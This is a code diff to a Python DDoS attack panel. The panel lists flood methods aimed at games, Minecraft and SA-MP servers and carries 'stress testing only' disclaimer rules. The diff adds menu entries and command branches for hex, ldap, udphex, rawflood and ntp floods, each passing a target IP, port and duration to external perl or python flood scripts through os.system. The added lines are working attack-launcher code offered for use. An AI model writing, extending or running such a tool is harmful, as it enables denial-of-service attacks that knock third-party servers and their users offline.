@@ -94,7 +94,7 @@ def rules():
     print(f'''
                 1. Hanya tujuan pengetesan               
                 2. Only attack stress testing servers         
-                3. Don't skid the panel                       
+                3. Don't skid the panel   CREDS TO MONEYMATCHH FOR ALL LAYER4 METHODS                    
                 4. The creator does not do any harm           
                 
 ''')
@@ -135,10 +135,13 @@ def layer7():
 – .ovh-amp : Games attack tools
 – .minecraft : attack server Minecraft
 – .samp : Attack server samp
-– .ldap : server Attack games
+- ldap
 – .Max : Max attack power 100Gbps
 – .stress : Attack form raw
-
+- udphex
+- rawflood
+- hex 
+- ntp
 [ LAYER - 7 ]
 
 – .http-random-v2
@@ -397,7 +400,6 @@ def main():
             except IndexError:
                print("Usage: [url] [time] [rate] [threads] [proxy]")
              
-
         elif "flux" in cnc:
             try:
                 ip = cnc.split()[1]
@@ -409,6 +411,28 @@ def main():
                 print('Usage: flux <ip> <port> <threads>')
                 print('Example: flux 1.1.1.1 80 250')
 
+        elif "hex" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                ascii_vro()
+                os.system(f'perl hex.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: hex <ip> <port> <time>')
+                print('Example: hex 1.1.1.1 80 60')
+        
+        elif "ldap" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                ascii_vro()
+                os.system(f'perl ldap.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: ldap <ip> <port> <time>')
+                print('Example: ldap 1.1.1.1 80 60')
+        
         elif "god" in cnc:
             try:
                 ip = cnc.split()[1]
@@ -466,6 +490,29 @@ def main():
             except IndexError:
                 print('Usage: home <ip> <port> <packet_size> <time>')
                 print('Example: home 1.1.1.1 80 65500 60')
+
+        elif "udphex" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                ascii_vro()
+                os.system(f'python3 udphex.py {ip} {port} {threads} {time} 0 0')
+            except IndexError:
+                print('Usage: udp <ip> <port> <threads> <time>')
+                print('Example: udp 1.1.1.1 80 250 7500')
+        
+        elif "rawflood" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                duration = cnc.split()[3]
+                ascii_vro()
+                os.system(f'python3 rawflood.py {ip} {port} {duration} 0 0')
+            except IndexError:
+                print('Usage: udp <ip> <port> <duration>')
+                print('Example: udp 1.1.1.1 80 <duration>')
 
         elif "udp" in cnc:
             try:
